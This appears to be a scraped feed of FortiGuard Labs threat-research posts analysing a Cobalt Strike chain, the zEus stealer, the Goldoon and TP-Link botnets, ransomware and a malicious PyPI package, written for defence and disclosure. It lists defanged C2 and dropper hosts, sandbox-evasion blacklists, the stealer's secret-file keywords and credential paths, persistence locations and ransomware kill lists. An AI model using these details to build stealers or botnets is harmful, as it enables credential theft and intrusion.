Server’s (C2) URLs: “hxxps://simonandschuster[.]shop/the-zero-residual-concept/products” and “hxxps://simonandschuster[.]shop/the-zero-residual-concept/sjj-solutions.” In this sophisticated attack, the assailant employs multi-stage malware tactics to thwart detection while ensuring operational stability. By implementing location-based checks during payload downloads, the attacker aims to mask suspicious activity, potentially eluding scrutiny by analysts. Leveraging encoded strings, the VBA conceals crucial import strings, facilitating the deployment of DLL files for persistence and decrypting subsequent payloads. Furthermore, the self-deletion feature aids evasion tactics, while the DLL injector employs delaying tactics and terminates parent processes to evade sandboxing and anti-debugging mechanisms, respectively. These orchestrated maneuvers converge towards the deployment of Cobalt Strike onto targeted endpoints, particularly within the confines of Ukraine's geopolitical landscape. As Office documents provide troves of functionality, including numerous plugins and scripts, users must exercise utmost caution when handling files sourced from dubious origins. Vigilance is paramount, particularly regarding any suspicious file drops or unfamiliar startup programs within registry settings.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Many game makers allow users to alter a game's appearance or behavior to increase its enjoyment and replay value. Players can often also download packages created by others. However, this is also a chance for attackers to distribute their malware. This article examines a batch stealer distributed via a crafted Minecraft source pack. The zEus stealer malware has been added to a source pack that was being shared on YouTube. The name—zEus—is from a previous variant of this malware. The variant (d9d394cc2a743c0147f7c536cbb11d6ea070f2618a12e7cc0b15816307808b8a) is also distributed via a Minecraft source pack, but it’s embedded in a WinRAR self-extract file. The self-extract file mimics a Windows screensaver file. It runs the stealer and opens the image used as a file icon. It’s an image from the Internet with the string “zEus” added. This name is also found in a profile of the Discord webhook receiving stolen data. When a victim executes the zEus stealer, it checks whether it is being analyzed. If not, it collects sensitive information and drops script files to make the attack more flexible. The zEus stealer creates folders in C:\\ProgramData to save stolen data and malicious script files. zEus checks whether it is being analyzed by comparing the computer name and currently running processes with blacklists. Computer name blacklist: WDAGUtilityAccount, Abby, Peter, Wilson, hmarc, patex, JOHN-PC, RDhJ0CNFevzX, kEecfMwgj, Frank, 8Nl0ColNQ5bq, Lisa, John, george, PxmdUOpVyx, 8VizSM, w0fjuOVmCcP5A, lmVwjj9b, PqONjHVwexsS, 3u2v9m8, Julia, HEUeRzl, BEE7370C-8C0C-4, DESKTOP-NAKFFMT, WIN-5E07COS9ALR, B30F0242-1C6A-4, DESKTOP-VRSQLAG, Q9IATRKPRH, XC64ZB, DESKTOP-D019GDM, DESKTOP-WI8CLET, SERVER1, LISA-PC, JOHN-PC, DESKTOP-B0T93D6, DESKTOP-1PYKP29, DESKTOP-1Y2433R, WILEYPC, WORK, 6C4E733F-C2D9-4, RALPHS-PC, DESKTOP-WG3MYJS, DESKTOP-7XC6GEZ, DESKTOP-5OV9S0O, QarZhrdBpj, ORELEEPC, ARCHIBALDPC, JULIA-PC, d1bnJkfVlH, QDAVNJRH Program blacklist: httpdebuggerui, wireshark, fiddler, vboxservice, df5serv, processhacker, vboxtray, vmtoolsd, vmwaretray, ida64, ollydbg, pestudio, vmwareuser, vgauthservice, vmacthlp, x96dbg, vmsrvc, x32dbg, vmusrvc, prl_cc, prl_tools, xenservice, qemu-ga, joeboxcontrol, ksdumperclient, ksdumper, joeboxserver The zEus stealer grabs a wide range of information. It creates individual text files for each piece of information and saves them to corresponding folders. The folders for stolen information are in C: \\ProgramData\\STEALER, including the PCINFO, IPINFO, HARDWARE, BROWSERS, STEAL, LDB, and SESSION folders. This folder contains two folders: IPINFO and HARDWARE. zEus looks up the victim’s IP address and related details using the online tools My External IP, ipapi, and ip-api. The results are saved as text files in the IPINFO folder. Using the IP address, zEus queries for further information from the tools, including the internet service provider, location details such as city, longitude, and latitude, and postal code. In addition, it collects the status of whether the victim is using a proxy server and if a mobile network is being used. Next, zEus uses command-line utilities and PowerShell to collect hardware information and saves the results in the HARDWARE folder, including currently running processes, OS version, product key, hardware ID, system configuration, installed programs, and WIFI password. zEus copies files for login data and user preferences from the browsers’ profile path and stores them in corresponding folders. Below are the target browsers: Chrome, Opera, Brave, Vivaldi, Edge, Firefox From these browsers, it grabs files for login data and an encryption key for a password (if necessary). It then steals cookies, history, shortcuts, and bookmarks. This folder contains login data copied from the following software: Steam, osu!, Roblox, Growtopia, Discord The files are mostly copied from the software’s data path. In addition, zEus also searches for discord_backup_codes.txt in the Downloads folder. Discord_backup_codes.txt contains backup code that helps users log in when they lose their devices for multi-factor authentication (MFA). As a result, the zEus stealer tries to get the backup code from a default location for downloaded files. The LDB folder only stores .ldb files copied from %appdata%\\discord\\Local Storage\\leveldb. From these .ldb files, the attacker can extract Discord tokens containing account and password information and then log into the victim’s account. zEus also copies various data from the following path to the SESSION folder. Not only do these files contain credentials, but the attacker also collects information about the victim. For example, it copies the Logs folders from the parent folder of EpicGamesLauncher, which contains debug logs about EpicGamesLauncher. Additionally, it copies the parent folders of game companies like Battle.net and Electronic Art. With this knowledge, the attacker can know which games are popular with the victim and how to disguise the malware to achieve the next attack. Software Path Battle.net %appdata%\\Battle.netExclude strings: BrowserCache, Cache Electronic Arts %localappdata%\\Electronic Arts Epic Games %localappdata%\\EpicGamesLauncher\\Saved\\Config%localappdata%\\EpicGamesLauncher\\Saved\\Data%localappdata%\\EpicGamesLauncher\\Saved\\Logs Telegram %appdata%\\Telegram Desktop\\tdataExclude strings: config, dumps, tdummy, emoji, user_data, webview, *.json Minecraft %userprofile%\\.lunarclient\\settings\\game\\*.json%appdata%\\.minecraft\\*.json Proton VPN %localappdata%\\protonvpn Ubisoft %localappdata%\\Ubisoft Game Launcher zEus stealer also drops KEYWORDSEARCHER.bat and Keyword.txt to the STEALER folder. The batch file helps users search for keywords they want in a folder, and the text file is its README. After data collection, the STEALER folder is compressed into a zip file—STEALER.zip—and deleted. KEYWORDSEARCHER.bat and Keyword.txt are not used by the zEus stealer. Finally, zEus organizes the attack result and sends it with STEALER.zip attached. The result shows whether it has successfully stolen the items that should be in the STEALER folder, along with the following information: Execution date, user name, computer name, processor, anti-virus software, clipboard content, installed XBOX games, cryptocurrencies, sensitive files zEus stealer also checks whether the victim uses any of the following cryptocurrencies: Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, AtomicWallet, Guarda, Coinomi It also searches the Downloads folder for files whose names contain one of the following keywords: 2fa, mdp, motdepasse, mot_de_passe, login, seed, key, data, db, password, secret, account, acount, paypal, banque, metamask, wallet, code, exodus, memo, compte, token, backup, recovery These keywords are related to login mechanisms, such as 2FA (two-factor authentication), seed, and key. There are also some French keywords meaning password, bank, and account. Apart from information stealing, there are features performed by the script files that are dropped to C:\\ProgramData\\{ComputerName}: Feature FileName Kill Task Manager debugerkiller.bat Send Screenshot Screen.bat Screen Lock SYSTEMLOCK.bat, configSYSLOCK.vbs, bsod.hta Chat Box CHATBOX.bat C2 Communication RAT.bat, COMMANDS.txt, HISTORY.txt Among these files, debugerkiller.bat, Screen.bat, and RAT.bat are executed immediately, and their paths are registered under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to achieve persistence. To avoid suspicion, the names of Windows system files and folders are used as the value name. zEus stealer drops debugerkiller.bat and obscures its execution to keep terminating Task Manager. This is set to auto-run to ensure the screen lock mechanism works. zEus drops Screen.bat to keep sending a screenshot to the webhook every five seconds. This is executed automatically at startup to keep monitoring the victim’s computer. SYSTEMLOCK.bat and configSYSLOCK.vbs are dropped to perform this task. configSYSLOCK.vbs is the launcher for SYSTEMLOCK.bat. The attacker can execute configSYSLOCK.vbs via C2 communication. SYSTEMLOCK.bat pops up a message box telling the victim not to restart the computer and closes explorer.exe to stop the victim from interacting with most Windows items. The SYSTEMLOCK.bat then keeps executing bsod.hta, which it dropped to the ProgramData folder. This HTA file just shows a full-screen blank window. However, debugkiller.bat prevents the victim from opening Task Manager, so most well-known methods to stop a program are blocked. CHATBOX.bat is dropped to allow the victim to send at most five sentences to the attacker. This can be executed via C2 communication. zEus stealer drops RAT.bat to build C2 communication. RAT.bat downloads command-line instructions from onlinecontroler[.]000webhostapp[.]com to COMMANDS.txt. If the instruction is not duplicated, it will be executed, and the result will be written to HISTORY.txt later. The executed instruction is sent to the attack’s webhook to show the current situation. In addition, special messages for screen lock and chat box help the attacker with troubleshooting. RAT.bat is set to auto-run to continuously control the computer. zEus stealer has a relatively simple attack flow, but it collects a wide variety of information that provides data for the next attack and contributes to social engineering. This is a reminder about the dangers of downloading and using files from an unknown source. Even a source pack, usually loaded by the software, can be a carrier for malware. In addition to only downloading files from reputable sources and checking reviews of a file and author, FortiGuard Labs recommends enabling MFA as an additional protection layer. MFA prevents unauthorized account access if a password has been compromised and can also alert users to unusual account activities. We also recommend subscribing to a service like FortiRecon that automatically scans the web for leaked data. The malware described in this report is detected and blocked by FortiGuard Antivirus as: BAT/Agent.DI!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. FortiGuard IP Reputation and Anti-Botnet Security services proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. FortiRecon is a SaaS-based Digital Risk Prevention service backed by FortiGuard Labs cybersecurity experts. It scans the dark web to provide timely threat intelligence on threat actor activity, including leaked data, so organizations can respond rapidly to and shut down active threats. It can also detect evidence of attacks in progress and provide critical information about threat actor motivations and TTPs.

    "title": "Key Findings from the 2H 2023 FortiGuard Labs Threat Report",
    "link": "https://www.fortinet.com/blog/threat-research/key-findings-2h-2023-fortiguard-labs-threat-report",
    "content": "FortiGuard Labs Threat Research In the second half of 2023, the cybersecurity landscape experienced various significant developments—like the rise in sophisticated attacks targeting large-scale enterprises and critical industries—that impact every organization. In our2H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year’s second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed worldwide during this same period. Below are key takeaways from the report. During this period, we observed substantial activity among APT groups, more targeted ransomware attacks, new botnets and malware strains, and an uptick in IoT exploits. We’re seeing a continued trend of threat actors reusing “old” attacks, underscoring the importance of security practitioners remaining vigilant, as attackers aren’t likely to stop exploiting older vulnerabilities. Notably, adversaries are moving quicker than ever, exploiting new vulnerabilities 43% faster than in the first half of the year. This finding underscores the need for organizations to improve their patch management processes, ensuring that they’re updating software regularly to protect against fast-moving adversaries. Vendors also play a vital role in enabling customers to mitigate vulnerability risk. Every vendor has a responsibility to dedicate themselves to radical transparency, introducing robust security scrutiny at all stages of the product development lifecycle and proactively searching for and disclosing vulnerabilities. It’s no surprise that the threat of ransomware continues to keep security teams up at night. Across our sensors, ransomware detections surged 13 times higher over the first half of 2023. That was followed by a 70% drop during the latter half of the year, during which we also saw fewer organizations detecting ransomware variants. However, this shift isn’t a cause for celebration. In our2024 threat predictions report, we forecasted that adversaries looking for bigger payouts would turn their attention to critical sectors. This prediction came to fruition in 2H 2023: We witnessed a shift away from the traditional “spray and pray” ransomware strategy, with cybercriminals taking a more targeted approach and asking for higher ransom demands. Industrial organizations—including energy, healthcare, manufacturing, transportation, and automotive—experienced almost half (44%) of all ransomware and wiper detections in the second half of the year. Our FortiGuard Labs team monitors an array of globally deployed sensors that collect trillions of threat events worldwide each day. This unique vantage point gives us a detailed view of the threat landscape, including how exploit, malware, and botnet trends change. Exploitation activity captured by the FortiGuard Intrusion Prevention System (IPS) sensors running on our FortiGate Next-Generation Firewalls offers us visibility into how threat actors find vulnerabilities, exploit their targets, and build malicious infrastructure. Not surprisingly, IoT devices were popular targets, with attackers exploiting everything fromfirewallstoroutersduring the year’s second half. After threat actors find an exploitable vulnerability, their next step is often to deploy malware. Samples picked up by our various anti-malware solutions give us a better understanding of popular adversary tools, like JS/ScrInject and JS/Cryxos. Outside of these two consistently prevalent strains, four other malware families caught our attention in 2H 2023:AndroxGh0st,Apache ActiveMQransomware,Lazarus RATs, andAgent Tesla. Once infected with malware, systems often attempt to communicate with remote hosts to download additional payloads, establish command and control channels, and open backdoors into the environment. Botnet insights are vital to understanding the full scope of an attack. While we consistently see activity among Gh0st, Mirai, and ZeroAccess, we identified several new botnets to watch, including Prometei and DarkGate. In each threat landscape report, we aim to determine how long it takes for a vulnerability to move from initial release to exploitation and whether vulnerabilities with a highExploit Prediction Scoring System(EPSS) score are exploited faster. For the new exploits identified, attacks occurred an average of 4.76 days after discovery, which is 43% faster than the time-to-exploitation observed in 1H 2023. This underscores the need to use EPSS as an early warning system, as well as the importance of prioritizing patching efforts to mitigate the vulnerabilities most likely to be exploited. In 2022, we introduced the concept ofthe “red zone,”which helps security practitioners better understand how likely (or unlikely) it is that threat actors will exploit a specific vulnerability.We aim to help security teams prioritize their remediation efforts, focusing on the vulnerabilities that present the most significant risk. The good news is that only a fraction (<1%) of all published vulnerabilities were exploited in 2H 2023. However, when it comes to vulnerabilities, remember that what’s “old” is still new in the eyes of many attackers. We continue to see threat actors exploiting vulnerabilities over 15 years old, and nearly all organizations (98%) have detected exploits in their environments that have been in attackers’ toolboxes for at least five years. APT groups continue to be highly adaptable to changes in the digital landscape and are increasingly stealthy, carefully planning and executing their attacks. Based on intelligence from FortiRecon, we observed 38 of the 143 APT groups (27%) identified by MITRE as being active during the second half of the year. Of those, Lazarus Group, Kimusky, APT28, APT29, Andariel, and OilRig were the most active. While much of our telemetry shows us what actions attackers have taken previously, darknet intelligence helps us anticipate what adversaries may do next. In the last six months of 2023, threat actors discussed targeting organizations within the financial services industry most often, followed by the business services and education sectors. More than 20 significant zero days were shared on the dark web, and over 850,000 payment cards were advertised for sale. The most publicly active threat actors across the dark web were Valerka, Punktir, CoreLab, XXXX, and qwer. Disrupting cybercrime requires a culture of collaboration, transparency, and accountability on a larger scale than possible with each entity working independently. Cybersecurity vendors have a crucial role to play in this endeavor. Join us atRSA Conference 2024to learn more about the importance of driving responsible transparency across the industry during the session, “No More Secrets in Cybersecurity: Implementing Radical Transparency.” This discussion will feature renowned experts from organizations such as the Cyber Threat Alliance, the Cybersecurity and Infrastructure Security Agency (CISA), Fortinet, and the Former Undersecretary of the Department of Homeland Security. The latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed worldwide during the second half of 2023. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets.

    "title": "New “Goldoon” Botnet Targeting D-Link Devices",
    "link": "https://www.fortinet.com/blog/threat-research/new-goldoon-botnet-targeting-d-link-devices",
    "content": "FortiGuard Labs Threat Research Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlierImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High In April, FortiGuard Labs observed a new botnet targeting a D-Link vulnerability from nearly a decade ago, CVE-2015-2051. This vulnerability allows remote attackers to execute arbitrary commands via a GetDeviceSettings action on the HNAP interface. As a result, an attacker can create a crafted HTTP request with a malicious command embedded in the header. Our IPS signature captured attempts to exploit the CVE-2015-2051 vulnerability to propagate a new botnet that we have named “Goldoon.” Figure 1 shows the attack packet. If a targeted device is compromised, attackers can gain complete control, enabling them to extract system information, establish communication with a C2 server, and then use these devices to launch further attacks, such as distributed denial-of-service (DDoS). Our telemetry data also indicates that this botnet activity spiked in April, almost doubling the usual frequency. In this article, we will provide detailed insights into the propagation and actions of the Goldoon botnet. The attackers initially exploit CVE-2015-2051 to download a file “dropper” from “hxxp://94[.]228[.]168[.]60:8080.” The script is programmed to automatically download, execute, and clean up potentially malicious files across various Linux system architectures, including aarch64, arm, i686, m68k, mips64, mipsel, powerpc, s390x, sparc64, x86-64, sh4, riscv64, DEC Alpha, and PA-RISC. Each downloaded file, named “goldoon,” is executed immediately after its download and permission adjustment. After execution, the script removes the executed file and then deletes itself to erase any trace of its activity, thereby enhancing its stealth. The primary role of the “i686-linux-gnu” downloaded from the dropper is to get the botnet file. It first employs the XOR key, “YesItsAnAntiHoneypotBaby,” to decrypt the specific strings “linux” and “i686-linux-gnu.” After decoding, it attaches them to “/bins” to construct the full Uniform Resource Identifier (URI). It uses a fixed header, “User-Agent: FBI-Agent (Checking You),” to get the ultimate payload. Any attempt to open the targeted URI using a web browser will lead to the error message shown in Figure 7. Finally, it iterates through a set of paths, modifying each file it can write to and then deleting those files after modification. This is another cleanup mechanism to cover its tracks in a compromised system. Through analyzing the malware, we found that it has the following behaviors: Goldoon first initializes some required arguments for establishing a connection. For example, it uses “WolfSSL” for traffic encryption and sets the Google DNS server (i.e., “8.8.8.8”, “8.8.4.4”) as a DNS resolver. This allows the malware to carry through its attack. There are ten different autorun methods, each aiming to execute malware while the victim’s computer is starting up. We can classify them into the following types: Boot Execution, Daemon, and Logon Execution. The malware can execute itself through Linux booting initialize files or applications, such as “/etc/rc.local,” “crontab,” etc. Otherwise, it can be created as a daemon named “goldoon.server” and later enable itself to persist in the victim’s computer. In addition, the malware can also execute automatically as soon as the victim logs on to the compromised device. Autorun Type Autorun Method Boot Execution /etc/rc.local /etc/init.d/startup_script /etc/init.d/S99startup crontab /etc/profile Daemon /etc/systemd/system/goldoon.service /etc/inittab Logon Execution ~/.bashrc ~/.config/autostart/goldoon.desktop /etc/xdg/autostart/goldoon.desktop The Goldoon malware continuously tries to connect to its C2 server until a connection is established. It also records information about the targeted system, such as user name, etc. Once completed, the Goldoon malware receives packets from the C2 server. These contain commands for follow-up actions. The packet has seven cases that are set off by the C2 server. Two of them have obviously malicious purposes. One executes commands through “/bin/bash -c” on the victim host, and the other triggers different DoS attacks. According to our analysis, this malware contains an astounding 27 different methods related to various attacks. Protocol Attack Method ICMP ICMP Flooding TCP TCP Flooding, XMAS Attack, etc. UDP UDP Flooding DNS DNS Flooding HTTP HTTP Bypass, HTTP Flooding, etc. Other Minecraft DDoS Attack Table 2: Attack Methods Take a TCP SYN flooding attack as an example. The malware first gathers information about the target, such as its IP and port, and even checks whether the target IP is IPv6. Goldoon can launch DoS attacks through common protocols, including the game Minecraft. The malware uses various packets to launch a DoS attack, especially for attacks through TCP, which includes more than ten types of packets. Because some of these methods are empty, such as “http_exploit,” “http_xflow,” “http_pps,” and “http_cps,” we deduce that the attacker may have an ongoing development of the malware. While CVE-2015-2051 is not a new vulnerability and presents a low attack complexity, it has a critical security impact that can lead to remote code execution. Once attackers successfully exploit this vulnerability, they can incorporate compromised devices into their botnet to launch further attacks. FortiGuard Labs has identified one such new botnet, “Goldoon,” that is exploiting this vulnerability, reminding us that botnets continue to evolve and exploit as many devices as possible. We strongly recommend applying patches and updates whenever possible because of the ongoing development and introduction of new botnets. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BAT/Agent.G!tr.dldrELF/Agent.JL!tr.dldrELF/Agent.GLN!trPOWERSHELL/Agent.G!tr.dldrW64/Agent.GLN!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service.

    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-keganohitobito-and-donex",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the KageNoHitobito and DoNex ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High KageNoHitobito ransomware samples became available in late March 2024. As with most ransomware, this ransomware encrypts files on victims' machines and demands a ransom to decrypt them through dropped ransom notes. Although the group uses TOR to communicate with its victims, a data leak site is unavailable as it does not claim to have stolen any victims' information. Information on the infection vector used by the KageNoHitobito ransomware threat actor is unavailable. The KageNoHitobito ransomware samples were submitted to a publicly available file scanning service from several countries: Chile, China, Cuba, Germany, Iran, Lithuania, Peru, Romania, Sweden, Taiwan, the United Kingdom, and the United States. This suggests that the KageNoHitobito ransomware threat actor may have made the malware available on file-sharing services as fake software or game cheats and lured victims to these locations. The KageNoHitobito ransomware is designed to encrypt files only on the local drive, not on networked drives. The files encrypted by the ransomware have a “.hitobito” extension. It avoids encrypting files with the following file extensions: .dat .dll .exe .ini .log .sys The ransomware is designed not to continue if the current date of the compromised machine is 14 days after March 21, 2024. The ransomware displays a ransom note on the victim’s desktop and drops a text-based ransom note called \"KageNoHitobito_ReadMe.txt.\" KageNoHitobito is Japanese and can be translated as \"shadow people.\" We could not associate the term \"shadow people\" with any popular culture, including Japanese anime, to which some threat actors are fixated. The ransom note instructs victims to visit a TOR site that uses the AbleOnion chat platform and join a chat room. This site does not appear to be specific to the KageNoHitobito ransomware, as the ongoing group chat in both the designated chat room and the group chat at the time of our investigation is unrelated to ransom negotiations. DoNex is a relatively new, financially motivated ransomware group first reported in early March 2024. The file creation time of the samples is mid-February, so the ransomware may have been distributed prior to the date of the first report. All victims of the DoNex ransomware on the data leak site were added in February. Information about the infection vector used by the DoNex ransomware threat actor is unavailable. However, it is not likely to be significantly different from other ransomware groups. The DoNex ransomware’s data leak site on TOR listed five victims during our investigation. The organizations that were claimed to have been affected by the ransomware are located in Belgium, the Czech Republic, Italy, the Netherlands, and the United States. The actions of DoNex ransomware are dictated by a configuration file set by the threat actor. The DoNex ransomware encrypts files on both local drives and network shares, as <local_disks> and <network_shares> are set to true. The ransomware adds a victim ID as a file extension to the affected files and changes their file icons. According to the <while_extens> section in the configuration file, DoNex ransomware avoids encrypting files with the following extensions: 386 adv ani bat bin cab cmd com cpl cur deskthemepack diagcab diagcfg diagpkg dll drv exe hlp icl icns ico ics idx lnk mod mpa msc msp msstyles msu nls nomedia ocx prf ps1 rom rtp scr shs spl sys theme themepack wpx lock key hta msi pdb search-ms It also avoids encrypting the following files listed in <white_files>: bootmgr autorun.inf boot.ini bootfont.bin bootsect.bak desktop.ini iconcache.db ntldr ntuser.dat ntuser.dat.log ntuser.ini thumbs db GDIPFONTCACHEV1.DAT d3d9caps.dat The DoNex ransomware does not encrypt files in the following folders listed in <white_folders>: $recycle.bin config.msi $windows.~bt ;$windows.~ws windows boot program files program files (x86) programdata system volume information tor browser windows.old intel msocache perflogs x64dbg public all users default microsoft appdata It terminates the following processes listed in <kill_keep>: sql oracle mysq chrome veeam firefox excel msaccess onenote outlook powerpnt winword wuauclt It terminates the following services listed in <services>: vss sql svc$ memtas mepocs msexchange sophos veeam backup GxVss GxBlr GxFWD GxCVD GxCIMgr The ransomware is configured to delete shadow copies, making file recovery difficult. It then drops a ransom note labeled “Readme.[victim ID].txt} that demands contact via a TOR site, TOX chat, or email. Another ransomware, DarkRace, which appeared in mid-2023, uses a very similar ransom note and has the same configuration file, indicating that DoNex is possibly based on DarkRace and that the threat actor behind DoNex may be the same as DarkRace. During our research, the DoNex ransomware was operating a data leak site on TOR, which listed five victims in Europe and North America. Since no new victims have been added since February 27th, the threat actor has likely already ceased operations and moved on. The KageNoHitobito and DoNex/DarkRace ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack.

    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High Vigilance is paramount in cybersecurity, especially when it comes to understanding and dissecting potentially malicious code. In this blog post, we'll delve into a piece of code designed (discordpy_bypass-1.7 ) to extract sensitive data from user systems. We'll analyze its components, functions, and methodologies to understand its purpose and approach. FortiGuard Labs uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor threats. Using this approach on the Python Package Index (PyPI) supply chain platform, we unearthed a malicious PyPI package named discordpy_bypass-1.7, published on March 10, 2024, and detected on March 12, 2024. This code aims to covertly extract sensitive information from unsuspecting victims using a blend of persistence techniques, browser data extraction, and token harvesting. Understanding the origins and propagation methods of malicious code is paramount in its analysis. Authored by theaos, the author produced seven versions of the package, including versions 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, and 1.7. The upgrade-colored_0.0.1 also exhibits similar malicious content as discordpy_bypass, indicating a consistent behavior pattern across versions. \"discordpy_bypass-1.7\" highlights the sort of ongoing threats seen across the cybersecurity landscape. This PyPI package version exhibits similar malicious behavior to previous malicious packages, focusing on extracting sensitive data from user systems through obfuscated code and evasion techniques targeting analysis environments. The code employs various checks to detect debugging or analysis environments and terminates itself if detected, showcasing the author's effort to evade scrutiny. The code has three layers. The original Python code is encoded using base64 (the innermost layer). The encoded strings are then broken into separate pieces and encoded once again with some obfuscation techniques (intermediate layer). The obfuscated file is then compiled using pyinstaller into an exe (the last layer) put on a remote URL. The code in discordpy_bypass/discordpy_bypass.py fetches the code from the URL and runs it on the user's device. This underscores the critical need for vigilance and proactive measures to effectively detect and mitigate cybersecurity threats. One of the first lines of defense code developers use against reverse engineering is detecting debugging or analysis environments. The code segment employs multiple techniques, listed below, to identify such environments and terminate the program’s “self-destruct” if detected. Block listed Processes: These iterate over the running processes and terminates them if their names match those in the blocked process list (“blacklistedProcesses”). These processes include debugging tools like Wireshark, OllyDbg, and IDA64 Network-related Checks: Compares system IP and MAC addresses against block lists (“blackListedIPS”, “blackListedMacs”). If the IP or MAC address is found in a block list, it returns “True,” indicating a debugging environment. System-related Checks: Compares system username, hostname, and hardware ID against block lists. (“blackListedUsers,” “blackListedPCNames,” and “blackListedHWIDS”) The code initializes a number of variables and sets up Socket.IO events to handle connections, disconnections, frame adjustments, and more. It enables remote control and monitoring of a system, facilitating actions such as directory navigation, file operations, and command execution. Several functions handle commands received over Socket.IO, executing various actions based on the command received. These actions include listing directory contents, sending files to the server, displaying alerts, listing processes, terminating processes, gathering system information, and more. Browser Data Extraction and Token Harvesting: The code's core functionality revolves around extracting sensitive information from browsers and harvesting authentication tokens, particularly from Discord. Browser Data Extraction: It utilizes techniques to extract data such as login credentials, cookies, web history, and more from various browsers. Token Harvesting: This process also decrypts and validates authentication tokens extracted from files, particularly Discord tokens, before uploading them to a remote server. Our investigation into the \"discordpy_bypass-1.7\" code has uncovered a clever and sneaky cyber threat to secretly steal important information from people's computers. What makes this code especially dangerous is how it tries to trick computer systems and experts who attempt to analyze it. It's like a master of disguise that can escape from being caught. This discovery reminds us that the internet isn't always a safe place. We need to stay alert to protect ourselves from such threats. Understanding them helps us build stronger defenses and stay safe in our digital world. By working together and staying cautious, we can keep our personal information and digital lives secure.

    "content": "FortiGuard Labs Threat Research Affected Platforms:TP-Link Archer AX21 (AX1800) Version 1.1.4 Build 20230219 or priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Last year, a command injection vulnerability,CVE-2023-1389, was disclosed and a fix developed for the web management interface of the TP-Link Archer AX21 (AX1800). FortiGuard Labs has developed an IPS signature to tackle this issue. Recently, we observed multiple attacks focusing on this year-old vulnerability, spotlighting botnets like Moobot, Miori, the Golang-based agent “AGoent,” and the Gafgyt Variant. Peaks caused by these threats are evident in the following figure. This article will explore their infection traffic patterns and offer insights into these botnets. This is an unauthenticated command injection vulnerability in the “locale” API available via the web management interface. Users query the specified form “country” and conduct a “write” operation, which is handled by the “set_country” function. It calls the “merge_config_by_country” function and concatenates the argument of the specified form “country” into a command string, which is executed by the “popen” function. Since the “country” field won’t be emptied, the attacker can achieve command injection. AGoent is a Golang-based agent bot. It first fetches the script file ”exec.sh“ from ”hxxp://5[.]10[.]249[.]153,” which retrieves the ELF files of different Linux-based architectures. After downloading the ELF files, the script will attempt to execute each file to find the appropriate architecture and remove each file to erase intrusion traces. The following analysis will focus on the executed file designed for the”386” architecture. There are two primary behaviors. The first is to create the host username and password using random characters. After user creation, the malware establishes a connection with the C&C (command and control) server and passes on the credentials just created by the malware. Gafgyt, also known as BASHLITE, is malware that infects Linux architecture operating systems to launch a DDoS (distributed denial of service) attack. In this variant, the bot downloads the script file “bins.sh” from “hxxp://195[.]62[.]32[.]227” and then executes the script. Gafgyt retrieves Linux architecture execution files with the prefix filename “rebirth.” We will next focus on “rebirth.x86.” Gafgyt gets the compromised target IP and architecture information, which it concatenates into a string that is part of its initial connection message. After establishing a connection with its C&C server, the malware receives a continuous \"PING\" command from the server to ensure persistence on the compromised target. The malware waits for any of the following commands from its C&C server. Each of them stands for a specified attack or function: Moobot fetches a script file from “hxxp://91[.]92[.]253[.]70.” The primary role of “1.sh” is to retrieve an ELF file with different architectures for further infection. The following analysis looks at the execution file designed for the “x86_64” architecture. Once executed, it removes itself and erases all traces from the compromised device. It then displays “0x00000e9” in the console and starts contacting the C2 server “fjsnsinfinsf[.]ngcv[.]top” Based on the XOR key “0xDEADBEEF” used for 